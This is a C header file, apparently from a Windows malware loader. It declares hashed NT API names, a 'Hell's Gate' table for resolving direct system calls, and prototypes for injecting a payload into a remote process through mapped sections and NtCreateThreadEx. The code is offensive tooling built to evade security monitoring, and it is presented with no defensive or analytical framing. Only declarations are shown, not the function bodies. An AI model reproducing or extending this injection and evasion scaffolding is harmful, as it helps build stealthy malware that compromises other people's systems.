#pragma once

#include <Windows.h>
#include "Structs.h"

// seed of the HashStringJenkinsOneAtATime32BitA/W funtions
#define INITIAL_SEED	8

// functions prototypes - functions defined in 'WinApi.c'
UINT32 HashStringJenkinsOneAtATime32BitW(_In_ PWCHAR String);
UINT32 HashStringJenkinsOneAtATime32BitA(_In_ PCHAR String);

#define HASHA(API) (HashStringJenkinsOneAtATime32BitA((PCHAR) API))
#define HASHW(API) (HashStringJenkinsOneAtATime32BitW((PWCHAR) API))


#define NtCreateSection_JOAA			0x192C02CE
#define NtMapViewOfSection_JOAA         0x91436663
#define NtUnmapViewOfSection_JOAA       0x0A5B9402
#define NtClose_JOAA					0x369BD981
#define NtCreateThreadEx_JOAA			0x8EC0B84A
#define NtWaitForSingleObject_JOAA      0x6299AD3D
#define NtQuerySystemInformation_JOAA   0x7B9816D6

typedef struct _VX_TABLE_ENTRY {
	PVOID   pAddress;
	UINT32	uHash;
	WORD    wSystemCall;
} VX_TABLE_ENTRY, * PVX_TABLE_ENTRY;


typedef struct _VX_TABLE {

	VX_TABLE_ENTRY NtCreateSection;
	VX_TABLE_ENTRY NtMapViewOfSection;
	VX_TABLE_ENTRY NtUnmapViewOfSection;
	VX_TABLE_ENTRY NtClose;
	VX_TABLE_ENTRY NtCreateThreadEx;
	VX_TABLE_ENTRY NtWaitForSingleObject;

	VX_TABLE_ENTRY NtQuerySystemInformation;

} VX_TABLE, * PVX_TABLE;


// functions prototypes - functions defined in 'HellsGate.c'
PTEB RtlGetThreadEnvironmentBlock();
BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory);
BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry);

// functions prototypes - functions defined in 'Inject.c'
BOOL InitializeSyscalls();
BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize, IN BOOL bLocal);
BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, IN DWORD* pdwPid, IN HANDLE* phProcess);

